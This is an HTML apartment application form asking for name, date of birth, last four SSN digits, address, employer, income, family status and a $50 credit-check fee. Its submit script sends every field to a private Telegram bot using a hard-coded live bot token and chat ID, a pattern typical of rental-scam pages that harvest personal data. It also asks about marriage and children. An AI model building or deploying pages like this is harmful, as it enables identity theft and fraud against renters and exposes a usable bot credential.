<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Apartment Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1502673530728-f79b4cab31b1') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      max-width: 900px;
      margin: 30px auto;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0px 4px 12px rgba(0,0,0,0.2);
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
      color: #2c3e50;
    }
    label {
      font-weight: bold;
      margin-top: 15px;
      display: block;
      color: #333;
    }
    input, select, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 14px;
    }
    .inline {
      display: flex;
      gap: 15px;
    }
    button {
      background: #2c3e50;
      color: #fff;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background: #1a242f;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Apartment Application Form</h1>
    <form id="applicationForm">
      
      <!-- Personal Information -->
      <h2>Personal Information</h2>
      <label>Type of Applicant:</label>
      <select name="applicant_type" required>
        <option value="">Select...</option>
        <option value="Tenant">Tenant</option>
        <option value="Guarantor">Guarantor</option>
      </select>

      <label>If Guarantor, prospective tenant & relation:</label>
      <input type="text" name="guarantor_relation" placeholder="Name & relation">

      <label>Name:</label>
      <input type="text" name="name" required>

      <label>Date of Birth:</label>
      <input type="date" name="dob" required>

      <label>Mobile Phone:</label>
      <input type="text" name="mobile_phone" required>

      <label>Last 4 of SSN:</label>
      <input type="text" name="ssn_last4" maxlength="4">

      <label>Email Address (For Online Rent Payments):</label>
      <input type="email" name="email" required>

      <!-- Rental History -->
      <h2>Applicant’s Rental History</h2>
      <label>Current Address:</label>
      <input type="text" name="current_address" required>

      <div class="inline">
        <div style="flex:1;">
          <label>Apt #:</label>
          <input type="text" name="apt_number">
        </div>
        <div style="flex:1;">
          <label>City:</label>
          <input type="text" name="city" required>
        </div>
        <div style="flex:1;">
          <label>State:</label>
          <select name="state" required>
            <option value="">Select State...</option>
            <option value="AL">Alabama</option>
            <option value="AK">Alaska</option>
            <option value="AZ">Arizona</option>
            <option value="AR">Arkansas</option>
            <option value="CA">California</option>
            <option value="CO">Colorado</option>
            <option value="CT">Connecticut</option>
            <option value="DE">Delaware</option>
            <option value="FL">Florida</option>
            <option value="GA">Georgia</option>
            <option value="HI">Hawaii</option>
            <option value="ID">Idaho</option>
            <option value="IL">Illinois</option>
            <option value="IN">Indiana</option>
            <option value="IA">Iowa</option>
            <option value="KS">Kansas</option>
            <option value="KY">Kentucky</option>
            <option value="LA">Louisiana</option>
            <option value="ME">Maine</option>
            <option value="MD">Maryland</option>
            <option value="MA">Massachusetts</option>
            <option value="MI">Michigan</option>
            <option value="MN">Minnesota</option>
            <option value="MS">Mississippi</option>
            <option value="MO">Missouri</option>
            <option value="MT">Montana</option>
            <option value="NE">Nebraska</option>
            <option value="NV">Nevada</option>
            <option value="NH">New Hampshire</option>
            <option value="NJ">New Jersey</option>
            <option value="NM">New Mexico</option>
            <option value="NY">New York</option>
            <option value="NC">North Carolina</option>
            <option value="ND">North Dakota</option>
            <option value="OH">Ohio</option>
            <option value="OK">Oklahoma</option>
            <option value="OR">Oregon</option>
            <option value="PA">Pennsylvania</option>
            <option value="RI">Rhode Island</option>
            <option value="SC">South Carolina</option>
            <option value="SD">South Dakota</option>
            <option value="TN">Tennessee</option>
            <option value="TX">Texas</option>
            <option value="UT">Utah</option>
            <option value="VT">Vermont</option>
            <option value="VA">Virginia</option>
            <option value="WA">Washington</option>
            <option value="WV">West Virginia</option>
            <option value="WI">Wisconsin</option>
            <option value="WY">Wyoming</option>
          </select>
        </div>
        <div style="flex:1;">
          <label>Zip:</label>
          <input type="text" name="zip" required>
        </div>
      </div>

      <label>Landlord/Mgmt. Co.:</label>
      <input type="text" name="landlord">

      <label>Landlord’s Phone:</label>
      <input type="text" name="landlord_phone">

      <label>Dates: From - To</label>
      <input type="text" name="rental_dates" placeholder="MM/DD/YYYY - MM/DD/YYYY">

      <label>Rent Amount:</label>
      <input type="text" name="rent">

      <label>Reason for Moving:</label>
      <input type="text" name="reason_moving">

      <!-- Employment -->
      <h2>Applicant’s Employment History</h2>
      <label>Current Employer:</label>
      <input type="text" name="employer">

      <label>Occupation/Position:</label>
      <input type="text" name="position">

      <label>Income:</label>
      <input type="text" name="income">

      <label>Pay Frequency:</label>
      <select name="pay_frequency" required>
        <option value="">Select...</option>
        <option value="Weekly">Weekly</option>
        <option value="Bi-Weekly">Bi-Weekly</option>
        <option value="Monthly">Monthly</option>
      </select>

      <!-- Additional Questions -->
      <h2>Additional Information</h2>
      <label>Are you married?</label>
      <select name="married" required>
        <option value="">Select...</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>

      <label>Do you have kids?</label>
      <select name="kids" id="kids" required>
        <option value="">Select...</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
      <div id="kids_number_div" class="hidden">
        <label>How many kids?</label>
        <input type="number" name="kids_number" min="1">
      </div>

      <label>Do you have a car?</label>
      <select name="car" required>
        <option value="">Select...</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>

      <label>Do you have a pet?</label>
      <select name="pet" id="pet" required>
        <option value="">Select...</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
      <div id="pet_type_div" class="hidden">
        <label>What type of pet?</label>
        <input type="text" name="pet_type">
      </div>

      <label>How long lease are you looking for?</label>
      <div class="inline">
        <input type="number" name="lease_months" min="0" placeholder="Months">
        <input type="number" name="lease_years" min="0" placeholder="Years">
      </div>

      <label>Are you ready to secure the apartment with security deposit?</label>
      <select name="deposit" required>
        <option value="">Select...</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>

      <label>When are you ready to move in?</label>
      <input type="date" name="move_in">

      <!-- Authorization -->
      <h2>Authorization</h2>
      <p>
        I hereby authorize the Landlord or Rental Agent to obtain information it deems desirable in the processing of my application,
        including credit reports, civil or criminal actions, rental history, employment/salary details, and any other relevant information.
        This application releases the Landlord, its employees and agents, from all liabilities and damage whatsoever incurred in furnishing
        and obtaining such information.
        <br>*Credit check fee: $50.00 per applicant
      </p>
      <label>
        <input type="checkbox" name="authorization" required> I agree to the above statement
      </label>

      <button type="submit">Submit Application</button>
    </form>
  </div>

  <script>
    // Kids logic
    document.getElementById("kids").addEventListener("change", function() {
      const kidsDiv = document.getElementById("kids_number_div");
      kidsDiv.style.display = (this.value === "yes") ? "block" : "none";
    });

    // Pet logic
    document.getElementById("pet").addEventListener("change", function() {
      const petDiv = document.getElementById("pet_type_div");
      petDiv.style.display = (this.value === "yes") ? "block" : "none";
    });

    // Submit form to Telegram
    document.getElementById("applicationForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const data = new FormData(this);
      let text = "🏠 *New Apartment Application* 🏠\n\n";
      data.forEach((value, key) => {
        text += `*${key}*: ${value}\n`;
      });

      const token = "8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc"; // replace with your bot token
      const chatId = "5590862324"; // replace with your chat id
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
      }).then(res => {
        if (res.ok) {
          alert("Application submitted successfully!");
          document.getElementById("applicationForm").reset();
        } else {
          alert("Error submitting application.");
        }
      });
    });
  </script>
</body>
</html>
